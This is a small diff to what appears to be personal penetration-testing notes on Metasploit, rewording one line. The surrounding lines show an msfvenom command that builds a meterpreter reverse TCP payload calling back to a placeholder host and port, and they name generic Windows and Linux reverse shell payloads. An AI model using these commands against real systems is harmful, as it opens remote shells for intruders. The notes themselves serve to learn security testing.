@@ -77,7 +77,7 @@ pagetitle: Metasploit
 	- Staged payloads will now give us an interactive shell
 - Steps:
 	- `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f c`
-		- We only get one meterpreter shell, so consider these instead:
+		- Can also use generic ones:
 			- `windows/x64/shell_reverse_tcp`
 			- `linux/x64/shell_reverse_tcp`
 	- `msfconsole`
